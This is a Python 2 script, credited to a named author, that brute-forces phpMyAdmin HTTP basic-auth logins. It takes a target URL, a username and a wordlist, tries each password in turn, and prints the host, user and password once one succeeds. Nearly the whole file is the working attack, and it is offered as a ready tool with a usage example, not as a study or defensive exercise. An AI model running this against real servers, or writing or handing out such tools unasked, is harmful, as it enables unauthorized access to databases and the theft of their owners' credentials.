#Created By: Milad Khoshdel
#Special Thanks: Mikili
#Blog: https://blog.regux.com
#Email: miladkhoshdel@gmail.com
#Telegram: @miladkho5hdel


import urllib2
import argparse
import sys
import os
import time

def banner():
	print(' ')
	print(' ################################################################################################')
	print(' ##                                                                                            ##')
	print(' ##                         __  __ ___ _      _   __  __ ___ _  __                             ##')
	print(' ##                        |  \/  |_ _| |    /_\ |  \/  |_ _| |/ /                             ##')
	print(" ##                        | |\/| || || |__ / _ \| |\/| || || ' <                              ##")
	print(' ##                        |_|  |_|___|____/_/ \_\_|  |_|___|_|\_\                             ##')
	print(' ##                                                                                            ##')
	print(' ##                                                             BY: Milad Khoshdel | Mikili    ##')
	print(' ##                                                             Blog: https://blog.regux.com   ##')
	print(' ##                                                                                            ##')
	print(' ################################################################################################')
	print(' ')	
	print('  Usage: ./phpmyadmin_brute_forcer.py [options]')
	print(' ')
	print('  Options: -t, --target    <hostname/ip>   |   Target')
	print('           -u, --user      <user>          |   User')
	print('           -w, --wordlist  <filename>      |   Wordlist')
	print(' ')
	print('  Example: python phpmyadmin_brute_forcer.py -t http://target/phpmyadmin -u [username] -w ./a.txt')
	print('	')

def restart_line():
    sys.stdout.write('\r')
    sys.stdout.flush()

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target")
parser.add_argument("-u", "--username")
parser.add_argument("-w", "--wordlist")
args = parser.parse_args()

if not args.target or not args.username or not args.wordlist:
    banner()
    sys.exit(0)

target = args.target
username = args.username
wordlist = args.wordlist	

a = 0


def login(t, u, p):
    try:
        sys.stdout.write('[-] checking user [' + u + '] with password [' + p + ']')
        sys.stdout.flush()
        passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
        passman.add_password(None, t, u, p)
        authhandler = urllib2.HTTPBasicAuthHandler(passman)
        opener = urllib2.build_opener(authhandler)
        urllib2.install_opener(opener)
        pagehandle = urllib2.urlopen(t)
        restart_line()
        sys.stdout.write('[-] checking user [' + u + '] with password [' + p + ']\t\t\tSuccess!')
        sys.stdout.flush()		
        print('')
        print('Password Successfully found.')
        print('')
        print('-------------------------')
        print(' Host: ' + t)
        print(' User: ' + u)
        print(' Pass: ' + p)
        print('-------------------------')
        return True
    except:
        restart_line()
        sys.stdout.write('[-] checking user [' + u + '] with password [' + p + ']\t\t\tFailed!')
        sys.stdout.flush()
        print('')
        return False
        pass


def attack(t, u, w):
    try:
        wordlist = open(w, "r")
        passwords = wordlist.readlines()
        for w in passwords:
            w = w.strip()
            result = login(t, u, w)
            if result:
			    exit()
    except IOError:
		print "\n Please Check your wordlist. \n"
		sys.exit(0)

		
attack(target, username, wordlist)